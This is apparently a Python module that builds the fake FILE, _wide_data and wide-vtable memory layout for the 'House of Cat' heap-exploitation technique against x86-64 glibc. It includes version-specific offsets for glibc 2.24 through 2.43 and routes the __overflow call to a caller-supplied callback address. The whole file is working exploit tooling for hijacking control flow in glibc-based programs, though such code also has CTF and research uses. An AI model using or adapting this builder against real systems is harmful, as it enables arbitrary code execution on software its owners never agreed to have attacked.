"""House of Cat wide-vtable sink layout builder for x86-64 glibc."""

from __future__ import annotations

from dataclasses import dataclass


FILE_WIDE_DATA = 0xA0
FILE_VTABLE = 0xD8
FILE_MODE = 0xC0
WIDE_WRITE_BASE = 0x18
WIDE_WRITE_PTR = 0x20
WIDE_VTABLE = {**{f"2.{minor}": 0x130 for minor in range(24, 30)}, "2.30": 0xF0}
WIDE_VTABLE.update({f"2.{minor}": 0xE0 for minor in range(31, 44)})

PRIMARY_SHIFT = 0x30
WIDE_OVERFLOW_SLOT = 0x18


@dataclass(frozen=True)
class MemoryWrite:
    address: int
    data: bytes
    label: str


def _uint(name: str, value: int, bits: int = 64) -> None:
    if not isinstance(value, int) or isinstance(value, bool):
        raise TypeError(f"{name} must be an integer")
    if value < 0 or value >= (1 << bits):
        raise ValueError(f"{name} does not fit in {bits} bits")


def _ptr(name: str, value: int) -> bytes:
    _uint(name, value)
    return value.to_bytes(8, "little")


def _write(address: int, data: bytes, label: str) -> MemoryWrite:
    _uint("address", address)
    return MemoryWrite(address, data, label)


def _image(size: int, fields: tuple[tuple[int, bytes], ...]) -> bytes:
    image = bytearray(size)
    for offset, data in fields:
        if offset < 0 or offset + len(data) > size:
            raise ValueError("field falls outside generated object")
        image[offset : offset + len(data)] = data
    return bytes(image)


def _wide_offset(version: str) -> int:
    try:
        return WIDE_VTABLE[version]
    except KeyError as exc:
        raise ValueError("House of Cat supports glibc 2.24 through 2.43") from exc


def build_house_of_cat(
    version: str,
    *,
    file_addr: int,
    fake_wide_data_addr: int,
    fake_wide_vtable_addr: int,
    callback_addr: int,
    wfile_jumps_addr: int,
) -> tuple[MemoryWrite, ...]:
    """Build the final wide-vtable callback layout from the three Cat PoCs.

    ``wfile_jumps_addr + 0x30`` is the shifted primary vtable used by the PoCs;
    the caller still has to deliver the FILE and trigger ``__overflow``.
    """

    for name, value in {
        "file_addr": file_addr,
        "fake_wide_data_addr": fake_wide_data_addr,
        "fake_wide_vtable_addr": fake_wide_vtable_addr,
        "callback_addr": callback_addr,
        "wfile_jumps_addr": wfile_jumps_addr,
    }.items():
        _uint(name, value)
    wide_offset = _wide_offset(version)

    file_image = _image(
        FILE_VTABLE + 8,
        (
            (FILE_WIDE_DATA, _ptr("fake_wide_data_addr", fake_wide_data_addr)),
            (FILE_MODE, (1).to_bytes(4, "little")),
            (FILE_VTABLE, _ptr("shifted_primary_vtable", wfile_jumps_addr + PRIMARY_SHIFT)),
        ),
    )
    wide_image = _image(
        wide_offset + 8,
        (
            (WIDE_WRITE_BASE, (0).to_bytes(8, "little")),
            (WIDE_WRITE_PTR, (1).to_bytes(8, "little")),
            (wide_offset, _ptr("fake_wide_vtable_addr", fake_wide_vtable_addr)),
        ),
    )
    vtable_image = _image(
        WIDE_OVERFLOW_SLOT + 8,
        ((WIDE_OVERFLOW_SLOT, _ptr("callback_addr", callback_addr)),),
    )
    return (
        _write(file_addr, file_image, f"FILE ({version})"),
        _write(fake_wide_data_addr, wide_image, f"fake wide_data ({version})"),
        _write(fake_wide_vtable_addr, vtable_image, "fake wide_vtable.__overflow"),
    )
